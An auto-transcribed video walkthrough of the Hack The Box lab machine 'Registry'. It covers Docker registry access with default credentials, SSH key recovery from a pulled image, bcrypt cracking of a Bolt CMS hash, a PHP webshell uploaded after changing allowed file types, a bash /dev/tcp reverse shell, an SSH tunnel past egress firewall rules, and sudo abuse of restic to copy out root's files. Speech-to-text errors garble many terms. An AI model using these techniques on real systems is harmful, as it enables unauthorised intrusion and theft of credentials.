 what's going on YouTube this is I'm doing registry from hack the box and I bet a lot of people were like me and thought this was gonna be a Windows box because the name registry but no this is a Linux box dealing with the docker registry which is just a repository for containers so once you figure that out and how to access the registry you can pull down a container do some forensics on it find an SSH key that allows you access into the actual box itself and then when you look around the web server on that box you notice the user dub-dub-dub - data can sudo to run a backup command so you have to do some white exploitation on the box to get a shell as that user and then when you backup the root directory you get not only route text but an SSH key to access the box as root so with all that being said let's just jump in and do the Box as always we're gonna start off with a hand map so - SC for default scripts as V enumerate versions hue output all formats in the nmap directory and call it registry and then the IP address which is ten ten ten one fifty nine can take some time to run so i've already ran it looking at the ports we have just three open we have ssh on port 22 and it's banner tells us as in ubuntu server we also have HTTP on port 80 it's running nginx and these scripts don't really tell us all that much we also have HTTPS on 443 as nginx as well but because it's an SSL service we get a bit more information such as the certificate leaking the hostname which is docker registry htb and then we also see when the certificate was generated and this can be kind of a hint at things to do since we see it's relatively recent at May 6 2009 teen and it's probably in relatively up-to-date box if I start a certificate that was valid from like 2012 to 2022 I may try older vulnerabilities such as heartbleed shellshock etc just because I know the box was around in a much earlier year doesn't mean the box wasn't generated before that because this is just when the certificate was generated but again most people probably wouldn't register a certificate unless it's about to expire and of course things like let's encrypt that do super short time spans that can get thrown out the window because you always have an up-to-date sir but but now let's just move on and create this dr. registry htb in a host file so we can do 10 10 10 1:59 put dr. dot registry HDB and i'm also just gonna put the parent registry HDV just in case that matters save that and we're going to go to 10 10 10 159 look at this page it's just the welcome to nginx and then I'm also gonna do dr. dot registry HDB we get just a blank page and I'll do it as SSL as well so HTTPS I copy the HTTP do this and we can poke around at the certificate just in case there's something that nmap missed such as like an email that may have a username or something always good just to look at the SSL certificate so going through dr. registry and we don't see any other information so let's just accept this and we're also just going to a blank page so dr. registry on h-2b goes here and just 10 10 10 149 goes to the welcome to nginx page and we can try a registry HDB as well and that also goes to the welcome to nginx page so two different sites on this box going back over to the nmap scan we see nginx 1.1 4.0 I'm just going to manually do a curl against this so - vvv because I want soup of reverse HTTP 10 10 10 159 then we're going to split the pain actually I want to do the other split go okay HTTP 10 10 10 159 and with there are a few V's in there as well I know there's a flag and curl to only display the header but I don't know if top my head so that's why I'm doing it this way so I'm just gonna go up and I'm looking at both of the headers of the web server just because I'm curious if there's anything that is different between the two so let's get here so engine X is the same spot so what up to 1/2 so nginx is the same HTTP is the same the dates both in the same time zone and around the same time so looking at this it's probably the same exact nginx server so far because we see no differences every now and then you'll see different like versions so maybe like nginx version 1.1 2 instead of 1.1 for which can be a big hint there's some type of VM or something on the box so nothing there let us just go and start a go Buster before we mainly poke at the box so we'll do go Buster - you HTTP registry dot h TB - w for list users share world list dirt Buster directory list - 3 medium - Oh will do go Buster - registry dot out and for this one let's copy it and we're gonna do something very similar I'm going to it up now let's copy this I also have to put it in dir mode I always forget that one flag I guess because I use go Buster for so long let's do docker registry HDB and we do go Buster - dr. Dell before I do this I'm going to try slash index dot PHP just to see if that exists and if I saw that then I probably do the extension - ex PHP so let's just run both of these go Buster's and begin looking at these servers so let's try robots.txt don't see anything we can try robots.txt here don't see anything we could see if we get a numerate user names so like squiggly root see if that goes to our home directory sometimes that is a quick win don't see any going back to go Buster we do have slash install so let's go take a look there I guess my clip copied everything let's just do slash install and we get a bunch of gibberish so let's make a new pane we'll make dirt HTTP and this will be things we just download so I can do double you get to download this file and we can do file against index.html and see it is a gzip file so I'm going to move index.html to install GZ and we'll do gzip dash D on this and we get unexpected and a file let's just try Z cat on the file and it looks like we can see the contents so we see see a dot cert and then begin certificate so I'm going to put this to just install and we do file against this it's at our archive now so we can do tired - xvf install and then extracted see a dot cert and read me so this is the file name this is some magical tar things and like permissions and then you got the actual file contents and then you got the file name readme MD which is the other file in the tar archive some magical tar stuff and then the actual file so that's how that works I'm not sure why the gzip command failed I just didn't have the like magical bytes at the end of the file to tell it that the decompression was done but obviously we could see it so looking at see a dot sir not exactly sure what this will be so I'm just going to rename the HTTP directory to install because that is what the name of the archive was and we can go back to go Busters to see if we have anything else we have /v 2 on the registry dot dr. dot registry HDB so let's go take a look at what that is it was on the docker page so go to docker registry HCB slash V 2 and we get it is requesting a username and password let's just try like admin admin it's always my go-to first attempt and we get logged in and it's just displaying a JSON thing so this is some type of JSON API and knowing a little bit about docker registry is a repository for docker so how you have apt and Ubuntu a debian think of that for docker so a registry contains a bunch of dr images that you can download and run so i'm gonna google docker registry api and we're going to take a look at it to see exactly how to use it it's saying accepts json data is probably a hint that it's an api if you did a curl against this or we can just look at it and burp suite you'll see that it responds with it accepts javascript is my burp suite intercept off refresh send to repeater click send and we can see where is accept content type application slash json so that's why Firefox is displaying this page it's not actually returning any contents it just knows that it's a JSON thing so it goes and displays that a little bit weird but that's how it works so looking at this probably should read the API but here we go over to v2 names so for example an API endpoint that will work with library Ubuntu would be this so we could try this at first so let's try v2 library ubuntu we get 404 not found let's see if we keep going through this we could probably find a way to less things so listing repositories is underscore catalog so if we do v2 slash underscore catalog we get the repository of bolt - image so if you read this more you'd be able to understand everything to do but we can just go to like slash bolt - image tags list I think and we have the tag is latest so if it had multiple things this would be like multiple versions so we can probably just say instead of tags latest manifests latest and then if we download this file let's go move it that's not manifests what it download is it a capital M okay I don't know what you just downloaded some file save oh it's latest okay so if we do file against this it is just JSON data so we can cat it or we can do cat pipe it to JQ get some highlighting and see what this is you get a bunch of blobs and there's a way to download each of these blobs let's see let's just try latest maybe FS layers and then the blob so let's try latest let's see fold image FS layers let's drive this works layers like this not found is it sha-256 not found we search this for blob let's see where is the download pulling a layer named blobs digest so if we do hole to image then blobs v2 named blobs digest b2 named blobs is the digest here history v1 I don't think it I don't think you include this because that doesn't look like you oh you do okay I was gonna say it's weird seeing the Kohl in it but if we download this file and we can move it here and do a file against it we can see it's gzip data so we can do gzip - D against this we got to move it so it has a GZ extension and then file against it it is at our archive so we're gonna make I'm just gonna call this temp because this isn't how we're actually going to do it this is just one way you could do it I don't like this way Tara - x CBF well we got to move this to be dr. Tara - X extract the F I don't know why I had to see C is create and we get Etsy profile do1 SSH so we could bless this and we see a password we can look at what this dot WH file is and it's nothing but uh I won't even take note of the password it is important but I really don't like doing it this way just because it's kind of wonky and I guess it is acceptable and hacking there's no non acceptable things just things that are slightly better I guess I'm gonna install a doctor in my system and we're gonna point our doctor at this and then download the image again an actual shell and play with it so let's do that so I don't run the command doctor it's not found so I'm going to do app search docker and we're going to find where dr. is what is the package name there's so many dr. dot registry if we want it set up our own docker registry but docker IO is what we actually want so I'm going to do have to install docker il and we're going to now be able to run docker so well once it unpacks so now we have dr. installed if we do witchdoctor it's there so let us login to the repository with docker so running docker login dr dot registry HDB news name was admin password was admin and we get this 509 certificates signed by an unknown authority there's a way to probably ignore certificates so that's just like if we try to curl HTTP docker registry htb and it doesn't go to the page unless we type - k to ignore it instead of trying to ignore it because that's something you should never really do especially with docker let's just add the CA certificate because there was that install directory that gave us CA sir so docker looks for certificates and Etsy docker certs d and then the host name so dr. dot registry htb I'm gonna make do a - P so it creates the parent directories because the summaries inserts D is not created so make there - be and we can copy see a dot cert to that directory and now when we run this docker login command logging in with admin admin oh we screwed something up so CD Etsy docker certs D docker registry dot HB so let's do docker registry HDB and now when we login we get a password restored unencrypted and root docker config dot JSON so we can look at that and just see it's there it's in base64 I believe not that this matters just something you should be aware of so maybe if you pop on a box that you think people have used dr. with maybe there's a file you want to look at because they may have plaintext creds there so since we knew the password that's not important but now we can run docker run and then docker registry dot h TB / bolt image which is the name of the image we want and I'm going to say run SH which is a shell so it's downloading it from the docker registry and then once it finishes downloading we can execute it and each of these are the blobs so we see one two three four five six seven eight nine blobs we go back here where is it that's catalog tags list what did we do to see blobs manifest it was manifest oh it's a file LS les latest so grep some on latest and then we can pipe that to WC - Ln C 10 so that is that now we have a shell on this so let's go take a look now we have that docker container up and running so this shell is actually on our local system because our system is running this docker image so we can just take a look at it and it's the same thing as if we had pulled each blog and manually examined it but having a shell and navigating through it is just sexier than going through a bunch of I guess file systems or whatever it is so let's go to slash root and then we can do find dot dash type F to display all the files and root and we see a SSH key so let's take a look at SSH / ID underscore RSA and we see begin encrypted private key begin I say private key but it is encrypted so let's I'm gonna type bash to see if it's here now I have a better shell so I'm going to copy this key over to my box and I'm gonna save some time and not crack it if you want to well not send it to John to be cracked because if you remember we got that password from the very first blob coincidentally that's the password to this key but I'm going to show how I went about and found the password because this is the way I did the box so let's make derp SSH and we can put ID RSA and I cop it via T MUX so paste it with that clipboard if we go down SH we can cat idrs a dot pub and we see it's user name is bulked at registry HB so presumably this key is for the bolt user so I'm gonna rename ID RSA to bolt just so I remember so we have a show over to this box we can also go to like slash home to see if there's any users there is we could check la verdad dub dub HTML and we see st. dot Sh so let's cat with that file is to see what it is and it's just our syncing registry v√©ra dub dub dub HTML bolt so it's going into the bolt directory on the registry box using that SSH thing if we go back in as sage is there dot config there is so because there is a SSH config file the host registry so whenever this container as is h's to the box registry it's going to use the user bolt and the host name registry htb so that's kind of what I do with the Kraken whenever you see me type SSH Kraken I believe I had that as a host file or a config file and SSH and I'm really hoping I don't have anything else in this SSH config that's sensitive ah no not really just other boxes that have retired so you can see host Kraken it's using the user root the host name as this IP because Kraken isn't a DNS name on my local subnet I just have it hard code to that IP and then using this SSH key so that's how that is configured let's take a look at root there is no root text here and since there was nothing in home there's no user dot txt but May 25th seems to be an interesting date because that's when ID RSA was and that's where everything else is remember the certificate was also generated on May 6 2009 teen from the very beginning of this video so the period between May 6 and May 26 probably interesting and you should always incorporate some type of instant response whenever you do anything because it is just super handy so here I'm going to search for all files modified between two thousand nineteen oh five zero six four two zero five zero five actually because there is a day before the SSL certificate was generated and then newer MT 2000 1905 twenty six a day after the SSH key we can do dev null and I always like doing - LS to see permissions I think I started talking after I typed newer and forgot to type MD for modified time let's see fine / - type F there we go so I'm not really that interested right away and stuff in var just because maybe for a temp in Verilog have interesting things but let's just get rid of that so I'm just gonna do a grep - be on or do whoops space slash bar to exclude that stuff so let's see we got slash run nginx pin on May 25th Lib curl we have them info which could be interesting because it's non zero bytes there's information in this file going through you do have this oh one SH so and look at this and I also notice we never looked at shadow so if we less Oetzi shadow there's no passwords in here and look at past WD no passwords there so we can't really crack any of those stuff but look at this proof all do one - sh sh and we see it is running expect ssh agent its spawning the command ssh ad adding the key to the agent and then it's expecting to get a password and then it's sending the password and saying hey the identity has been added so we try to SSH actually before I Sh might chmod 600 because all SSH keys should be 600 SSH both at registry HTV and we had specify - I balked yes and put the password and we get in before I move on let's just go and do some things so if you didn't understand the SSH host file uh let's go and show you so that SSH config and I'm going to copy their four lines whoops I keep paying two keys at once won't do host totally does not exist and its host name is going to be ten ten ten 1:59 the user is going to be fault and the identity file is going to be root htb boxes registry SSH bolt so if I do SSH to totally does not exist it's going to ask for the passphrase and we login so again this host thing is just when what you type when you try to SSH it will actually use the value host name to actually get to the box so that's that piece and then also I want to emphasize doing like IR forensics and you thing because I mentioned the let's just run this find command again I mentioned vim info was not zero so we take a look at this and we can see them was used to edit these files st. dot SH and the profile thing and this is just a file vim uses to keep like a history contents of what it does so if we edit this file let's do LS la route vim info so you can see last night it was May 25th them on this file let's go down to this Uihlein and then exit vim do it again was still on e and it remembers that based upon that women fell so now it was modified April 2nd so always handy to have you can poke around those files to see what programs were being used for so definitely definitely handy and also if I saw vim info I tried to search for like the van backup file which i think is like we can just check that see profile dot d actually let's do it on here so sh-sh do LS la nothing is here we do VI bolt LS la them created a swap file bolt dot swap so if I knew the administrator of the box love to use vim I'd also hunt for these dot s WP files to see if I can recover older versions of things so some extra bits of information so let's cut that file get the password and actually SSH to the box enough detours so we can do SSH to registry HDB - I bolt paste whoops we forgot to specify the username and now we are in this box so first thing I do is run IP addr to see if one the host or another docker container and based upon seeing e0 and that being the IP address of registry I'm pretty confident we're in the host operating system here is the docker IP so I may try to do things to look at the various docker containers so we can see 172 1802 and I don't see that here so I'm guessing this may be the registry try like 8,000 don't know what port that is do we have a map oh my god we have n map on this box port 5000 so if we curl on port 5000 / V - so 172 1802 is going to be the docker container of this guy so if I had cracked like Etsy shadow or I had any password in this I try going into this container live to see if it's the same exact thing as the webserver but I have no idea what the credentials are and running and map showed only a webserver was exposed not even SSH so from the bolt user I don't know how get into that docker container so I'm not even going to worry about it and running groups I'm not a member of the docker group so what can we do on this box well OS LA and we see user dot text was created on September 26 there is a dot SH directory so I'm going to take a look at it authorized keys and that's just going to be the key we already have the private key - so nothing interesting there it was doing something in verb dub HTML so go let's take a look at that there is backup PHP and backup dot beat PHP is doing a pseudo rustic backup - R and then backing up the bolt directory to this box I believe doing sudo - L put our password assuming we have the password I guess it's not my clipboard anymore copy test the paste suitor - L that is not the password for this guy so we have to have to find the password foot bolt or try to escalate to the dub-dub-dub data user and we also see get with dot - history it is zero so maybe we want to look at something owned by the user get so we can try find / - user get to dev null does that find it it does so right now we're just searching for anything with get and nothing is there but there is bolt and verb dub dub HTML so let's go take a look at what slash bolt is so going to registry th gb / bolt and it is just a website it looks like so I'm going to see if I can escalate to the dub-dub-dub data user because I see this backup dot PHP and generally when things get X you on the web server they're being executed as that user and that user probably has privilege to run sudo since we see pseudo rustic so I'm going to do is find dot - writable to see if it can write anywhere and I can't so have to figure out a vulnerability within bulked so we do an LS here and I see various web directories so we get index dot PHP SRC test licensed MD I'm just going to try to go to bolt licensed MD it does pull the file we can try this file I'm just seeing if like how this web server is configured so it will say we can access anything here what is in the app directory theme not how about index.php so let's see we're running PHP is web built-in server get app web PHP unless web PHP it's running something but if you dig through this a lot or go back to go Buster if you do bolt bolt it brings you to a login and bolt is just a what is bolt that's probably not gonna be what I think it is if you do a lot of research around this dig through it eventually it makes sense but we get a potential wall again I guess if we do search point on bolt whoops let's do search point bolt bolt CMS so that's what you'd be researching if you don't know exactly what this is so so at PHP CMS which is a content management system so doing a lot of research into that you get to the sign in page looking into potential exploits let's see a cross-site scripting cross-site scripting cross-site scripting remote code execution right here I hear this is like cross-site Oh cross-site request forgery but I wish like RCE that sticks out a lot more in version 3 6 6 is this same what version it is no probably like the license file may have less license 3.6 you get the copyright so you know it's from 2019 probably changelog md so if you looked at the changelog md let's just save the file less downloads changelog we can see it's probably running version three six four so that would be how you know you have to go to that remote code execution bolt let's do dash M de mirror go here last four six six and I don't know why some exploits do this so this is showing a proof of concept like cross-site request forgery by tricking an admin into clicking a link and then the link does a bunch of like cross-site scripting things we can see the xhr set request XML HTTP request if you want to see us create something like this I'm just did a video on it I bet if I search that you can look at bank robber to understand what this whole thing is doing we're just going to ignore it and now once we log in we can probably upload a file and then get code execution because that is what this is doing form data old admin URL slash upload so it's uploading a file editing a config things like that so if you read that whole thing and kind of understood where it did then you know that so we have to figure out how to log in to bolt and luckily we have a shell on the web server so I'm going to find dot grep - I and database and we see app database bolt dot DB so CD app database o CD app database don't want a beginning slash we have bolt DB so I can copy bolt DB to dev s hm and then we can just host this file we could also do SCP to copy it but because my SSH key requires a password I don't remember the password it's just easier to host a web server so by then - am simple HTTP server and then I'm going to go back to my box and we'll just do W get - R for recursive registry dot h DB : 8000 and it's going to download everything and devis s hm which should probably just be the bolt database so registry th TB and we can do file against data bolt DB sequel light so sqlite3 bolt DB dot dump to dump everything and we can look around so right now we're looking at bolt auth token and we see 3-1 null and then let's see ID user ID user name token salt so i don't know what this is but we see oh that's my IP so i don't care about this one let's see then once I've done sequel light I do select star from this yeah dot tables sweet so what I was trying to do here to see maybe we could do some type of session hijack if we just grabbed whatever the session was for currently logged in user we could go back to our Firefox and then edit our cookie to be that session of the logged in user and potentially get access to it but that doesn't work blocks Cron's entry this isn't too interesting but bolt users so select stir from bolt users and we get a password to Y 10 whatever so this is some type of bcrypt probably and we see file /nc PHP and shell PHP so something we are there but let's try seeing if we can crack this password let's go let's just create a new tab or go back to an old tab we haven't used SSH crack in which again the machine I dedicate to cracking because you should never crack in a VM and I don't want to crack on my host because well I'm recording here and don't want to drop frames so let's do hashes / bolt paste that hash dot slash hash cat - - example - hashes I'm going to do less no search for - why - capital y let's see let's do dot slash hash cat example hashes - I bolt let's see - y 10 hash format - y 10 PHP C password hash maybe let's put two white n hash cat search for password cracking does this tell us what format it is iteration I'm just going to search for be clipped I guess crap - i bcrypt to stir a dollar so this is probably it so less bcrypt 3200 let's just try that so dot slash hash cat - m 3200 hashes slash bolt and then we'll do opt word list rock you and let this go and see if it cracks and for those that are wondering I've done this box before but I just had news for me I did it like four or five months ago so some of this stuff I'm actually trying to figure out for I guess maybe the second a fifth time because I don't always remember everything but we get the password as a strawberry so let's go and what was that oh we're doing bolt so sign into bolt with admin and strawberry and we get here so that cross-site request forgery had us going to edit the config and then upload a file so if we do file management let's just try upload file we can close out of these unused tabs if we try to select a file they were doing shell PHP so root HDB boxes registry let's create the file shell PHP and we'll do PHP request please subscribe and we want to put system around that so we actually execute the command okay so if we try to upload this file let's do all files shell PHP upload cannot be uploaded and needs these extension types so what it was doing was going into the config and editing the extension types so let's go scroll till we get to extension types I think I just pass it right here put PHP here save it and then we can go back to upload a file select showed up eh B upload open like a new tab and we said it will execute anything with the please subscribe variable so please subscribe is equal to who am i dub dub dub data if we do PWD we get this so we can try sudo - L if we look at the source dub dub dub data may run the following commands on bolt so now we know we have a shell so let's get a reverse shell so we do bash - I dev TCP 1010 14 - 0 & 1 NCLB NP 9001 don't get anything let's just try bash - see nothing let's send this actually to burp put it in a post request because maybe it's the format that's going it up so let's change request method control Z Who am I sent to repeater make sure this works 404 not found so there must be something hitting that backup dot PHP which is causing this to revert probably so let's hit save make sure this saves upload the shell and this where the box gets relatively annoying so now we got the shell back fast - see bash - I dev TCP 1010 fourteen to nine thousand one zero one like that and then URL encode it with control U and we don't get anything back so let's try going back to boot if we can do curl 1010 14 - 4 9001 and nothing hits us so let's try pinging TCP dump - I ton zero ICMP and I'm gonna get the argument for ping wrong I just know it ping will do - see one for count 10 10 14 - oh I got the argument right I'm actually getting better - and his windows for number but we can see we can ping we just can't go out TCP what I'm going to do is go back here because this is why I'm SS aged on the box and we're going to do CD Etsy find grep IP ta looking for like IP table rules there's an IP tables comp and we can see what rules are here so we want to look at output so on output to the 10 network TCP flags FinCEN rest X and drop so what this is doing is oh it's also preventing UDP so it is preventing us from starting a three-way handshake outbound so let's see do we have it on other interfaces we could try localhost so let's do n CL v NP 9001 and try curl one 27001 9001 to see if we can hit ourselves locally for a for not found so let's save the file upload the shell again save the file upload the shell again so it's waiting and we got a hit back so we can do I don't know what B is but B apparently worked I meant to do V but we should be able to do a shell on localhost because the output table is only that way and also you don't see anything on input so if we upload a net cat to the box we could probably do it that way as well of just having that cat bind to a port and then we connect to that port but let's try this bash - see bash - I dev TCP 127 zero zero one nine thousand one zero and one control you send oh that's gonna I'm gonna get angry it's probably one of the more annoying things to have to do every time you want to run I command all files upload I'm Matt and we get a show as dub-dub-dub - beta awesome so if we do Python C input PT y PT y dot spawn then - st - why you're wrong - echo hit FG enter so now we just have a better thing where we have tab all to complete all that stuff so we are now dub-dub-dub - data so let's go back and look at that backup dot PHP file what is it export term is equal to X term and now I can clear the screen so it's running pseudo rustic - H and a password Oh because sudo - - shell rustic has with a backup - or a rest so the first thing I'm going to do Google GTFO bins and see if it knows anything about rustic it does not you don't know what this is you type the binary you click things and I tells you how you can potentially abuse those binaries on Linux super awesome it's like Lal bins but for Linux so don't really have anything there if we did a lot of research into rustic like what is rustic it's a backup solution that does backups right so if we set up a rest server so instead you up to backup registry htb we back up to our box then we be able to backup files so what this is doing is sending the file bolt to this location or directory I think - are is recursive so the main issue we're gonna have is we can't send initiate a packet out Balam so if we tried to run this command and had our arrests over here then it wouldn't work still because we can't send packets outbound so if we do NCL vnp it's do 8000 pseudo rustic backup - arrest HTTP 10 10 14 - for 8,000 bolt bolt try to run that command it never hits us again that's because that iptables rule so in order to get around that what we can do let's see can we do this still I'm gonna hit the so if this is your first command on a s8 window it pops up a head and menu thing like that so I'm gonna do - capital R 8000 one 27001 8,000 so now I forwarded port 8000 on this box and anything that hits that is gonna get forwarded to me so we do netcat one 27001 8,000 hello from bolt and we can see it goes through this tunnel so now if I run this command again the rustic backup if I was listening on 8,000 and we change oh god what is it s TTY calls call think calls let's do s TTY - eh calls 146 rose 18 I think that said it so now I can do this command if you notice perform the columns were set to whatever number this is so once I hit that it would wrap it to the beginning so I just expanded it to go down to this end just fixing my terminal up so now we can do one 2700 one on port 8000 and I'm listening on port 8000 on this box it hits it so now we have to set up a rustic server on Callie so it actually understands that protocol and it's written in and golang but the easiest way to run it is through docker but before we install rustic we have to install the docker container we have to set up the environment so I'm installing rustic on my box and what I'm going to do is create the file system in this folder and then share that file system to the docker container because doctors aren't really supposed to be persistent so this is probably a good way to do it I guess so I'm going to make the directory data and we're gonna go rustic a knit - our data password further atrocity I'm just going to do password ok and now it has created that repository so if I do LS data we have everything but we have to set up the rest ik server so I'm going to do is docker run we're going to port 8000 8000 so that is mapping port 8000 on my local box to 8000 - the docker container and then - V for volume root HDB boxes registry and we're going to do data and I'm going to share that and slash data and then - IT for image name rustic rest server I'm going to do SH to execute and this is just going to pull a rustic image from docker hub I believe or maybe pull it from registry by docker hub I should have done like a TCP dump or something I looked at it but anyways we got a rustic server running on a box so what we want to do is type rest server - - path slash data and now it started the server on port 8000 and data we go to slash data that is just that volume mount thing we did so run this now we run this backup command again and oh so this is going to be just slash and then we could leave it a bolt and see what this does the password was password and now it's backing up and it's backing up wait a bit they're just back up the whole box hopefully I do 206 Meg's that is big yeah I'm just going to probably pause the video and let this finish so now it has saved so let's go and make the directory restore and we can just do rustic - our data we're specifying where the arrest ik filesystem is and that is in data so rustic - data restore latest and then the target is gonna be restore the password was password and now it is copying all the files to restore go into bolt and that is the website so the website is just pretty big 256 Meg's so let's do the same exact thing except instead of bolt or do / root I just type it the password so I have to type it again and now it is saving so let's go over to this window restore what I must be in a different window what we do rustic - our data latest target restore Resik our historic data password is password now we go into restore we have the root directory and we have root dot txt which is 33 characters that's 32 and a line break you have a cron that is restoring things if you do LS la you also copy the dot ssh directory and there is a ID RSA which is SH key so chmod 600 as its sshi and registry htb and we are now route on this box so hope you guys enjoyed it take care and I will see you all next week